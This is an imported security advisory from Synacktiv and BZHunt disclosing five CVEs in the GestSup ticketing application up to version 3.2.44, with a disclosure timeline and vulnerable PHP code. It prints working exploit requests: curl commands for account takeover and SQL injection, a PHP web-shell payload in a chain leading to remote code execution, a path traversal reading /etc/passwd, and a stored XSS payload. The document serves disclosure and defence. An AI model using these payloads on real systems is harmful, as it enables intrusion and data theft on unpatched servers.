---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-22_multiple-vulnerabilities-on-gestsup-3244.md
original_filename: 2024-01-22_multiple-vulnerabilities-on-gestsup-3244.md
title: Multiple Vulnerabilities On GestSup 3.2.44
category: documents
detected_topics:
- sqli
- xss
- command-injection
- sso
- password-reset
- api-security
tags:
- imported
- documents
- sqli
- xss
- command-injection
- sso
- password-reset
- api-security
language: en
raw_sha256: 7c5951e72ba450f906a8cc2e12ee41345ef7af48b4f848383c2049be7106e908
text_sha256: b7c79817741be3db858948689976f19c080b74952bbf195c21081cb941adec73
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Multiple Vulnerabilities On GestSup 3.2.44

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-22_multiple-vulnerabilities-on-gestsup-3244.md
- Source Type: markdown
- Detected Topics: sqli, xss, command-injection, sso, password-reset, api-security
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `7c5951e72ba450f906a8cc2e12ee41345ef7af48b4f848383c2049be7106e908`
- Text SHA256: `b7c79817741be3db858948689976f19c080b74952bbf195c21081cb941adec73`


## Content

---
title: "Multiple Vulnerabilities On GestSup 3.2.44"
page_title: "Multiple vulnerabilities on GestSup 3.2.44"
url: "https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244"
final_url: "https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244"
authors: ["Pierre Martin (@_Worty)", "Romain Brun (@SpawnZii)"]
programs: ["GetSup"]
bugs: ["Account takeover", "SQL injection", "Stored XSS", "Security code review"]
publication_date: "2024-01-22"
added_date: "2024-02-01"
source: "pentester.land/writeups.json"
original_index: 511
---

![](../sites/default/files/2023-06/synacktiv-logo-noir.svg)

# Multiple vulnerabilities on GestSup 3.2.44

22/01/2024  \- [Téléchargement](multiple-vulnerabilities-on-gestsup-3244#) __

Product

GestSup

Severity

Critical

Fixed Version(s)

3.2.45

Affected Version(s)

≤ 3.2.44

CVE Number

CVE-2024-23163, CVE-2024-23164, CVE-2024-23165, CVE-2024-23166, CVE-2024-23167

Authors

Pierre Martin

Romain Brun (BZHunt)

## Description

### Presentation

[GestSup](https://gestsup.fr/) is an application used for ticketing purposes and device management. It offers several levels of privileges, from simple users allowed to create tickets, to application administrators able to configure the application, manage users or create SMTP connections.

### Issue(s)

Leveraging several vulnerabilities, an unauthenticated attacker is able to gain remote code execution on the server hosting a GestSup instance.

### Timeline

Date | Description  
---|---  
2023.12.13 | Advisory sent to GestSup  
2023.12.15 | Acknowledgement from GestSup and version 3.2.45 released  
2024.01.12 | CVE IDs assigned  
2024.01.22 | Public release  
  
## Technical details

![collaboration](/sites/default/files/2024-01/collaboration.webp)

### 

Account takeover (CVE-2024-23163)

#### Description

The `ticket_user.php` file contains the following code:
  
  
  <?php
  [...]
  }elseif($_POST['modifyuser']) {
  $qry=$db->prepare("UPDATE `tusers` SET `firstname`=:firstname, `lastname`=:lastname, `phone`=:phone, `mobile`=:mobile, `mail`=:mail, `company`=:company WHERE `id`=:id");
  $qry->execute(array('firstname' => $_POST['firstname'],'lastname' => $_POST['lastname'],'phone' => $_POST['phone'],'mobile' => $_POST['mobile'],'mail' => $_POST['usermail'],'company' => $_POST['company'],'id' => $_GET['user_id']));
  echo json_encode(array("status" => "success", "user_id" => $_GET['user_id'], "firstname" => $_POST['firstname'],"lastname" => $_POST['lastname']));
  }
  [...]

Because this file is not protected by authentication, it is possible to takeover any account by modifying the `usermail` field to a controlled email address and requesting a password reset. The following example shows the compromise of the administrator account (`user_id` 1):
  
  
  $ curl http://localhost/ajax/ticket_user_db.php -X POST --data "modifyuser=1&lastname=poc&firstname=poc&phone=&mobile=&mail=attacker@server.com&company=&id=1" -H "X-Requested-With: xmlhttprequest"
  {"status":"success","user_id":"1","firstname":"poc","lastname":"poc"}

After changing the password, one can access the application as an administrator:

![Admin Panel](/sites/default/files/inline-images/admin_panel.webp)

#### Impact

An attacker could bypass the authentication process and access the application as an administrator user.

### 

SQL injections as superuser (CVE-2024-23166)

#### Description

GestSup can be used to create statistics. In the `stats/line_ticket.php` file, dangerous code patterns are used, such as SQL queries without prepared statements.
  
  
  <?php
  [...]
  $query="SELECT COUNT(*) FROM `tincidents` WHERE technician LIKE '$_POST[tech]' AND criticality LIKE '$_POST[criticality]' AND type LIKE '$_POST[type]' AND category LIKE '$_POST[category]' AND u_service LIKE '$_POST[service]' $where_service $where_agency $where_tech_group AND $where_state AND date_create NOT LIKE '0000-00-00 00:00:00' AND date_create LIKE '$_POST[year]-$_POST[month]-%' AND disable='0'";
  if($rparameters['debug']) {echo $query;}
  $query=$db->query($query);
  $row=$query->fetch();
  $count=$row[0];
  $query->closeCursor(); 
  [...]

While the application restricts several POST parameters to specific values in the `dashboard.php` file, this is not the case of the `tech` parameter:
  
  
  <?php
  [...]
  $db_order=strip_tags($db->quote($_GET['order']));
  $db_order=str_replace("'","",$db_order);
  if($_GET['way']=='ASC' || $_GET['way']=='DESC') {$db_way=$_GET['way'];} else {$db_way='DESC';}
  $db_state=strip_tags($db->quote($_GET['state']));
  $db_viewid=strip_tags($db->quote($_GET['viewid']));
  $db_techgroup=strip_tags($db->quote($_GET['techgroup']));
  $db_u_group=strip_tags($db->quote($_GET['u_group']));
  $db_t_group=strip_tags($db->quote($_GET['t_group']));
  $db_techread=strip_tags($db->quote($_GET['techread']));
  $db_userread=strip_tags($db->quote($_GET['userread']));
  $db_keywords=strip_tags($db->quote($_GET['keywords']));
  [...]
  

However, GestSup uses middleware to sanitize user input:

  * `init_get.php`
  * `init_post.php `

They are used whenever a GET or POST request is issued to the web server, and are always executed before performing any action. They are configured with a list of parameters to sanitize using the `htmlspecialchars` function. The code responsible for this process is the following, from the `init_post.php` file:
  
  
  <?php
  [...]
  foreach($all_post_var as $post_var) {
  //init var
  if(!isset($_POST[$post_var])){$_POST[$post_var]='';}
  //secure var
  if($_GET['table']!='tservices') {
  $_POST[$post_var]=htmlspecialchars($_POST[$post_var], ENT_QUOTES, 'UTF-8');
  } // bug ldap sync service #4995
  }
  [...]
  

Nevertheless, if a POST request is issued, but a GET parameter named `table` with value `tservices` is present, the sanitization is not performed. Using this bypass, we can perform an SQL injection with the following request:
  
  
  $ curl -X POST "http://localhost/index.php?page=stat&tab=ticket&table=tservices" --cookie "PHPSESSID=[...]" --data "services=2&category=%25&criticality=%25&state=&month=11&year=2023&tech=test';--"

This is a second order SQL injection. After sending this request, the following URL can be used to visualize the output: `http://localhost/index.php?page=stat&tab=ticket&table=tservices`.

![SQL Injection](/sites/default/files/inline-images/sqli.webp)

Another similar injection was also identified in the `dashboard.php` file:
  
  
  <?php
  [...]
  if($_POST['date_hope']!='') {
  $where.="AND tincidents.date_hope LIKE '$_POST[date_hope]%'";
  }
  [...]

An injection can be performed using the following cURL request :
  
  
  $ curl -X POST "http://localhost/index.php?page=dashboard&tab=ticket&table=tservices&state=a&techgroup=1" --cookie="PHPSESSID=[REDACTED]" --data "date_hope='"

This is also a second order SQL injection and the results can be retrieved at the following URL: `http://localhost/index.php?page=dashboard&tab=ticket&table=tservices&state=a&techgroup=1`.

![SQL Injection](/sites/default/files/inline-images/sqli2.webp)

#### Impact

Because the `query` function of the PDO is used, this vulnerability may allow a privileged attacker to perform `SELECT`, `UPDATE` or `DELETE` requests to alter the application data.

### 

Dangerous file manipulation and storage (CVE-2024-23164)

#### Description

Ticket attachments are stored using the following format as file name: `<ticket_id>_<md5(uniq_id())>` . When tickets are merged, the application processes the attachments to rename them using the target ticket ID. This routine is implemented in the `ticket_fusion.php` file:
  
  
  <?php
  [...]
  $qry=$db->prepare("SELECT `id`,`storage_filename`,`real_filename` FROM `tattachments` WHERE ticket_id=:ticket_id");
  $qry->execute(array('ticket_id' => $source_ticket));
  while($attachment=$qry->fetch()) 
  {
  //rename storage filename
  $new_storage_filename=explode('_',$attachment['storage_filename']);
  $new_storage_filename=$target_ticket.'_'.$new_storage_filename[1];
  
  rename("upload/ticket/$attachment[storage_filename]", "upload/ticket/$new_storage_filename");
  [...]
  }
  [...]

While standard users are not able to upload files using a controlled name, administrators can upload a new application logo with a specific name kept by the server. Using the SQL injection from the previous section, it is therefore possible to make an attachment point to this controlled file.

Using a specific file name format, it is then possible to abuse the merging routine to make it rename the file with a PHP extension. Indeed, if the source file is named `1234_.php_random.png`, the routine will rename it to `<ticket_id>_.php`.

To summarize, here is the exploitation chain to achieve remote code execution:

  * Create a ticket.
  * Upload the PHP payload as the new application logo.
  * Perform an SQL injection to update an entry of the `tattachments` table containing ticket attachment. Specifically, the `storage_filename` field of an attachment will be updated to `../logo/1234_.php_random.png`.
  * Merge two tickets to reach the attachments merging routine.

First, a ticket is created and its ID is noted.

![New Ticket](/sites/default/files/inline-images/ticket.webp)

A new logo is then uploaded. While the application blocks files containing the `<?php` string, it is possible to use the following payload: `<?`$_GET[0]`;?>`.

The SQL injection is then used to update the `storage_filename` field in the `tattachments` table:
  
  
  $ curl -X POST 'http://localhost/index.php?page=stat&tab=ticket&table=tservices' --data "service=2&tech=test';update tattachments set storage_filename = \"../logo/5_.php_random.png\" WHERE ticket_id=5;#&category=%25&criticality=%25&state=&month=11&year=2023" --cookie "PHPSESSID=[...]"
  [...]
  
  $ curl -X GET http://localhost/index.php?page=stat&tab=ticket&table=tservices --cookie "PHPSESSID=[...]"

The ticket is then merged with another one. Finally, the `http://localhost/upload/ticket/<ticket_id>_.php?0=id` URL is used to execute remote commands:

![Remote Code Execution](/sites/default/files/inline-images/rce_0.webp)

#### Impact

The dangerous file manipulation performed by GestSup can lead to remote code execution when coupled with other vulnerabilities such as SQL injections, from an administration user.

### 

File read on email templates (CVE-2024-23165)

#### Description

GestSup allows sending emails when tickets are created or modified. An administrator can choose the template to be used, from the administration panel, using the following option:

![Modify Mail Template](/sites/default/files/inline-images/mail.webp)

The HTTP request below is issued when the administrator saves the option:
  
  
  POST /index.php?page=admin&subpage=parameters HTTP/1.1
  Host: 127.0.0.1
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Content-Type: multipart/form-data; boundary=---------------------------278940070919065442643415265116
  Content-Length: 4910
  Origin: http://127.0.0.1
  Cookie: PHPSESSID=[...]
  
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="company"
  
  Company
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="server_url"
  
  http://gestsup
  [...]
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="mail_template"
  
  default.htm
  -----------------------------278940070919065442643415265116--

Here, an evil administrator can overwrite the `mail_template` parameter, in order to read local files of the server:
  
  
  POST /index.php?page=admin&subpage=parameters HTTP/1.1
  Host: 127.0.0.1
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Content-Type: multipart/form-data; boundary=---------------------------278940070919065442643415265116
  Content-Length: 4910
  Origin: http://127.0.0.1
  Cookie: PHPSESSID=[...]
  
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="company"
  
  Company
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="server_url"
  
  http://gestsup
  [...]
  -----------------------------278940070919065442643415265116
  Content-Disposition: form-data; name="mail_template"
  
  ../../../../../../../../../../../../../../../etc/passwd
  -----------------------------278940070919065442643415265116--

When an attacker exports a ticket to the email script, the content of the local file is displayed in the email body:

![Fileread](/sites/default/files/inline-images/fileread.webp)

#### Impact

A compromised administrator could read local files of the server hosting the GestSup application.

### 

Unauthenticated stored XSS on calendar events (CVE-2024-23167)

#### Description

GestSup allows its users to add events to the calendar of all users. This is the HTTP request sent when a user adds an event to their calendar.
  
  
  POST /ajax/calendar.php HTTP/1.1
  Host: localhost
  Cookie: redacted
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 103
  Origin: http://localhost
  
  action=add_event&title=test&start=2023/12/13 07:30:00&end=2023/12/13 08:00:00&allday=false&technician=1

The code associated with this feature does not check the validity of the user session, but solely relies on the presence of the `X-Requested-With: XMLHttpRequest` header (`ajax/calendar.php` file).
  
  
  <?php
  [...]
  //security check
  if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') 
  {
  [...]
  }
  [...]

Because the `title` parameter is reflected directly on the page without sanitization, it is possible to add a JavaScript payload.
  
  
  POST /ajax/calendar.php HTTP/1.1
  Host: localhost
  Cookie: redacted
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 103
  Origin: http://localhost
  
  action=add_event&title=<img/src/onerror=alert(1)&start=2023/12/13 07:30:00&end=2023/12/13 08:00:00&allday=false&technician=1

![XSS](/sites/default/files/inline-images/xss.webp)

#### Impact

This vulnerability could allow unauthenticated attackers to compromise users accessing the Calendar feature of the application.

### Credits

This advisory is the result of a collaboration between Synacktiv and [BZHunt](https://bzhunt.fr/).

![Synacktiv](/sites/default/files/inline-images/synacktiv_0.webp)

![BZHunt](/sites/default/files/inline-images/bzhunt.webp)

Partagez cet article
